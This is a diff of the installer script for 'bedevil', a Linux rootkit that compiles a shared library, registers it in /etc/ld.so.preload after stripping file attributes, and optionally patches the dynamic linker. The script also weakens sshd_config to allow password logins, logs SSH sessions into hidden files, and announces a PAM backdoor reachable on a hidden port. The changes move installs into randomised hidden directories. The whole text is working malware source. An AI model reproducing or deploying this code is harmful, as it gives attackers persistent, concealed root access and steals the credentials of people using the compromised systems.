@@ -9,25 +9,26 @@ eecho() { printf " \e[31m[!]\e[0m $1\n"; }
 secho() { printf " \e[32m[+]\e[0m $1\n"; }
 necho() { printf " [..] $1\n"; }
 
-[ $(id -u) != 0 ] && { eecho "You do not have root privileges. Your actions are limited."; NOT_ROOT=1; }
+[ $(id -u) != 0 ] && { eecho "You do not have root privileges, your actions are limited"; NOT_ROOT=1; }
 [ -e /proc ] || { eecho "/proc doesn't exist. May I suggest bailing?"; exit; }
 [ `which gcc` ] || { eecho "GCC not found"; exit; }
-[ -f /etc/ssh/sshd_config ] || { eecho "/etc/ssh/sshd_config not present."; exit; }
-[[ $(cat /etc/syslinux/config 2>&1 | grep "SELINUX=" | tail -n 1) == *"enforcing"* ]] && eecho "SELinux detected (enforcing)"
+[ -f /etc/ssh/sshd_config ] || { eecho "/etc/ssh/sshd_config not present"; exit; }
+[[ $(cat /etc/syslinux/config 2>/dev/null | grep "SELINUX=" | tail -n 1) == *"enforcing"* ]] && eecho "SELinux detected (enforcing)"
 
 [ -d /proc/xen ] && wecho "Xen environment detected"
 [ -d /proc/vz ] && wecho "OpenVZ environment detected"
 [ -f /usr/bin/lveps ] && wecho "CloudLinux LVE detected"
-[[ $(cat /proc/scsi/scsi 2>&1 | grep 'VBOX') == *"VBOX"* ]] && wecho "VirtualBox VM detected"
+[[ $(cat /proc/scsi/scsi 2>/dev/null | grep 'VBOX') == *"VBOX"* ]] && wecho "VirtualBox VM detected"
 
+# default values for settings. (can/will be changed later...)
 [ -z $MGID ] && MGID=`cat /dev/urandom | tr -dc '1-9' | fold -w 4 | head -n 1`
-[ -z $IDIR ] && IDIR="/lib/bedevil.$RANDOM"
+[ -z $IDIR ] && IDIR="$(bash etc/get_recurdir.sh)/.$RANDOM"
 [ -z $BD_ENV ] && BD_ENV="`cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1`"
 [ -z $LDSO_PRELOAD ] && LDSO_PRELOAD="/etc/ld.so.preload"
-[ -z $SSH_LOGS ] && SSH_LOGS="/lib/bedevil.$RANDOM"
+[ -z $SSH_LOGS ] && SSH_LOGS="$(bash etc/get_recurdir.sh)/.$RANDOM"
 [ -z $BDVLSO ] && BDVLSO="`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n1`.so"
 [ -z $MDIR ] && MDIR="symbols"
-[ -z $NEW_MDIR ] && NEW_MDIR="${RANDOM}_$MDIR"
+[ -z $NEW_MDIR ] && NEW_MDIR="${BDVLSO}.$MDIR"
 [ -z $PLATFORM ] && PLATFORM="`uname -m`"
 
 declare -a array YUM_DEPS=("gcc" "pam-devel" "newt" "libgcc.i686" "glibc-devel.i686" "glibc-devel" "libpcap" "libpcap-devel" "vim-common")
@@ -54,37 +55,34 @@ xenc()
 
 crypt_password()
 {
-    [ `which python3` ] && echo -n `python3 -c "import crypt;print(crypt.crypt(\"$1\"))"`
-    [ `which python3` ] || echo -n $(openssl passwd -6 -salt `cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 16 | head -n1` $1)
+    [ `which python3` ] && { echo -n `python3 -c "import crypt; print(crypt.crypt(\"$1\"))"`; return; }
+    echo -n $(openssl passwd -6 -salt `cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 16 | head -n1` $1)
 }
 
 patch_libdl()
 {
-    necho "Patching dynamic linker libraries."
+    necho "Patching dynamic linker libraries"
     LDSO_PRELOAD="$(etc/plibdl.sh $LDSO_PRELOAD)"
     secho "New ld.so.preload location: $LDSO_PRELOAD"
 }
 
 cleanup_bdvl()
 {
-    secho "Cleaning up local mess."
+    secho "Cleaning up local mess"
     rm -rf $NEW_MDIR bdvl.c *.so.*
 }
 
 install_deps()
 {
-    necho "Installing dependencies."
-    if [ -f /usr/bin/yum ]; then
-        yum install -y -q -e 0 "${YUM_DEPS[*]}" &>/dev/null
-    elif [ -f /usr/bin/apt-get ]; then
+    necho "Installing dependencies"
+    [ -f /usr/bin/yum ] && yum install -y -q -e 0 "${YUM_DEPS[*]}" &>/dev/null
+    [ -f /usr/bin/pacman ] && { pacman -Syy &>/dev/null && pacman -S --noconfirm "${PAC_DEPS[*]}" &>/dev/null; }
+    if [ -f /usr/bin/apt-get ]; then
         dpkg --add-architecture i386 &>/dev/null
         yes | apt-get update &>/dev/null
         apt-get --yes --force-yes install "${APT_DEPS[*]}" &>/dev/null
         [ ! -z "$(apt-cache search libpcap0.8-dev)" ] && apt-get --yes --force-yes install libpcap0.8-dev &>/dev/null
         grep -i ubuntu /proc/version &>/dev/null && rm -f /etc/init/plymouth* &>/dev/null
-    elif [ -f /usr/bin/pacman ]; then
-        pacman -Syy &>/dev/null
-        pacman -S --noconfirm "${PAC_DEPS[*]}" &>/dev/null
     fi
 }
 
@@ -95,8 +93,7 @@ build_char_array()
     asize="#define `echo -n ${nam} | awk '{print toupper($0)}'`_SIZE $3"
     carr="\n${asize}\nstatic char *${nam}[`echo -n ${asize} | awk '{print $2}'`] = {"
     for e in ${arr[@]}; do carr+="\"`xenc $e`\","; done
-    carr="${carr::-1}};\n"
-    echo -n $carr
+    echo -n "${carr::-1}};\n"
 }
 
 write_char_arrays()
@@ -172,7 +169,7 @@ start_config_wizard()
         [ ! -z $REPLY ] && input=$REPLY
 
         [ ! -z "`printf "$varname"`" ] && eval "$varname=\"$input\""
-        [[ "$var" == *"BD_PWD"* ]] && input="`xenc $(crypt_password $input)`"
+        [[ "$var" == *"BD_PWD"* ]] && input="$(crypt_password $input)"
         PSETTINGS+="\"`xenc $input`\":$var "
     done
 
@@ -190,13 +187,13 @@ start_config_wizard()
     done
 
     SOPATH="$IDIR/$BDVLSO.$PLATFORM"
-    secho "Configuration finished.\n"
+    secho "Configuration finished\n"
     verb $PSETTINGS
 }
 
 populate_new_placeholders()
 {
-    cp -r $MDIR/ $NEW_MDIR/ || { eecho "Couldn't copy module directory."; exit; }
+    cp -r $MDIR/ $NEW_MDIR/ || { eecho "Couldn't copy module directory"; exit; }
 
     write_char_arrays
     start_config_wizard
@@ -235,23 +232,23 @@ compile_bdvl()
     LINKER_OPTIONS="-Wl,--build-id=none"
     LINKER_FLAGS="-ldl -lcrypt"
 
-    rm -f *.so.*
+    rm -f *.so.* 2>/dev/null
     gcc -std=gnu99 $OPTIMIZATION_FLAGS bdvl.c $WARNING_FLAGS $OPTIONS -I$NEW_MDIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $BDVLSO.$PLATFORM
     gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS bdvl.c $WARNING_FLAGS $OPTIONS -I$NEW_MDIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $BDVLSO.i686 &>/dev/null
-    strip -s $BDVLSO.$PLATFORM || { eecho "Couldn't strip library. Exiting."; exit; }
-    strip -s $BDVLSO.i686 &>/dev/null
+    strip -s $BDVLSO.$PLATFORM || { eecho "Couldn't strip library, exiting"; exit; }
+    [ -f $BDVLSO.i686 ] && strip -s $BDVLSO.i686
 
     secho "Shared library compiled. ($BDVLSO.$PLATFORM $(ls -lhN $BDVLSO.$PLATFORM | awk '{print $5}'))" && rm -f bdvl.c
 }
 
 install_bdvl()
 {
-    [ ! -z $NOT_ROOT ] && { eecho "You cannot install bedevil without root. Exiting."; exit; }
+    [ ! -z $NOT_ROOT ] && { eecho "You cannot install bedevil without root, exiting"; exit; }
 
     secho "Starting full installation!\n"
 
     wecho "Do you want to patch the dynamic linker?"
-    wecho "If you are doing this, you need to do this now."
+    wecho "If you are doing this, you need to do this now"
     read -p "`wecho "Patch libdl? [Y/n]: "`" -n 1 -r
     [[ $REPLY =~ ^[Yy]$ ]] && patch_libdl
     echo
@@ -268,7 +265,7 @@ install_bdvl()
     necho "Installing $BDVLSO to $IDIR"
     mkdir -p $IDIR/
     cp $BDVLSO.$PLATFORM $SOPATH
-    cp $BDVLSO.i686 $IDIR/$BDVLSO.i686 2>&1
+    cp $BDVLSO.i686 $IDIR/$BDVLSO.i686 2>/dev/null
 
     [ "$(cat /etc/ssh/sshd_config | grep 'UsePAM')" == "UsePAM yes" ] || echo "UsePAM yes" >> /etc/ssh/sshd_config
     [ "$(cat /etc/ssh/sshd_config | grep 'PasswordAuthentication yes')" == "PasswordAuthentication yes" ] || sed -i -e 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
@@ -276,13 +273,13 @@ install_bdvl()
     necho "Pointing $LDSO_PRELOAD to $SOPATH"
     [ -f "$LDSO_PRELOAD" ] && chattr -ia $LDSO_PRELOAD &>/dev/null
     echo -n $SOPATH > $LDSO_PRELOAD
-    secho "Installation successful."
+    secho "Installation successful"
     cleanup_bdvl
     echo
 
     setup_home $IDIR
-    secho "Your PAM backdoor is set up."
-    secho "See 'etc/ssh.sh' on connecting with your hidden port."
+    secho "Your PAM backdoor is set up"
+    secho "See 'etc/ssh.sh' on connecting with your hidden port"
 }
 
 setup_home()
@@ -310,7 +307,7 @@ echo -e \"\\033[1mSSH logs: \\033[1;31m\$(cat ~/ssh_logs | wc -l)\\033[0m\""
     echo "$RBASHRC" > $LBASHRC
 
     mkdir $1/etc
-    for f in ${CFILES[*]}; do cp $f $1/$f; done
+    for f in ${CFILES[@]}; do cp $f $1/$f; done
 
     necho "Hiding rootkit files"
     touch $SSH_LOGS && chmod 666 $SSH_LOGS && ln -s $SSH_LOGS $1/ssh_logs
@@ -339,7 +336,7 @@ while getopts "h?vdpcCbiD" opt; do
         echo "$HELPMSG" && exit
         ;;
     v)
-		secho "Running in verbose mode."; VERBOSE=1
+		secho "Running in verbose mode"; VERBOSE=1
         ;;
     d)  
         populate_new_placeholders
@@ -365,7 +362,6 @@ while getopts "h?vdpcCbiD" opt; do
         ;;
     D)
         install_deps
-        exit
         ;;
     ?)
         echo "$HELPMSG" && exit
